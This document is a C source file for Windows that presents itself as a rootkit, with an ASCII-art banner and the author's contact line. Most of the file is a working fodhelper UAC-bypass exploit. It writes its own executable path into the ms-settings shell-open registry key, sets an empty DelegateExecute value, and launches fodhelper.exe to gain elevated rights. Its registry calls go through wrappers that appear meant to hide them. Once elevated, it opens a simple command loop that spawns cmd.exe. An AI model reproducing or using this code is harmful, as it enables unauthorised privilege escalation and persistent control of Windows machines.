// made by augboi incorporated
// established 2002
// based out of hoboken NJ

// shoot me an email! augustgl@protonmail.ch


/*
                           __ _       _        
                          / _| |     | |       
  ___ _ __   _____      _| |_| | __ _| | _____ 
 / __| '_ \ / _ \ \ /\ / /  _| |/ _` | |/ / _ \
 \__ \ | | | (_) \ V  V /| | | | (_| |   <  __/
 |___/_| |_|\___/ \_/\_/ |_| |_|\__,_|_|\_\___|
 
 
           .:'
      __ :'__
   .'`__`-'__``.
  :__________.-'
  :_________:
   :_________`-;
    `.__.-.__.'

*/                                             

#include <Windows.h>
#include <shlobj.h>
#include <stdio.h>

#include "vxheader.h"
#include "hiddencalls.h"

#define KEYONE "Software\\Classes\\ms-settings\\Shell\\open\\command" // DO NOT CHANGE

BOOL vxCreateFodhelperKey(LPSTR path) {

	HKEY hKey;
	//long n = RegOpenKeyA(HKEY_CURRENT_USER, KEYONE, &hKey);
	int n = vxRegOpenKeyA(HKEY_CURRENT_USER, KEYONE, &hKey);

	vxRegSetValueExA(hKey, "", 0, REG_SZ, (LPBYTE)path, strlen(path));
	vxRegSetValueExA(hKey, "DelegateExecute", 0, REG_SZ, (LPBYTE)"", sizeof(""));
	

	vxRegCloseKeyA(hKey);

	return TRUE;

}

BOOL vxExecuteFodhelper() {
	

	PROCESS_INFORMATION pi = { 0 };
	STARTUPINFOA si = { 0 };

	si.cb = sizeof(STARTUPINFO);
	
	if (!CreateProcessA("C:\\Windows\\System32\\cmd.exe", "/c C:\\Windows\\System32\\fodhelper.exe", NULL, NULL, FALSE, NORMAL_PRIORITY_CLASS, NULL, NULL, &si, &pi)) {
		DWORD fuck = GetLastError();
		return FALSE;
	}
	/*
	if (!WinExec("C:\\Windows\\System32\\cmd.exe /c C:\\Windows\\system32\\fodhelper.exe", SW_SHOW)) {
		return FALSE;
	}*/



	else {
		return TRUE;
	}
}

BOOL vxEscalate() {
	char path[MAX_PATH];
    GetModuleFileNameA(NULL, path, MAX_PATH);

	BOOL bAdmin = vxIsUserAnAdmin();

	if (!bAdmin) {
		if (!vxCreateFodhelperKey((LPSTR)path)) {
			goto FAIL;
		} 
		if (!vxExecuteFodhelper()) {
			goto FAIL;
		}
	}
	return TRUE;

FAIL:
	return FALSE;

}


int main(int argc, char *argv[]) {
	
	if (IsUserAnAdmin() == TRUE) {

		while (1) {
			printf("WELCOME TO THE ROOTKIT /// fuck the gov \n");

			printf("enter a command: ");

			char cInput[256];
			fgets(cInput, sizeof(cInput), stdin);

			printf("%s\n", cInput);

			if (strcmp(cInput, "shell\n") == 0) {
				WinExec("cmd.exe", SW_SHOW);
			}
			if (strcmp(cInput, "exit\n") == 0) {
				exit(1);
			}
		}

	}
	else {
		printf("[*] exploit failed, attempting to escalate\n");
		vxEscalate();
	}
	getchar();

}
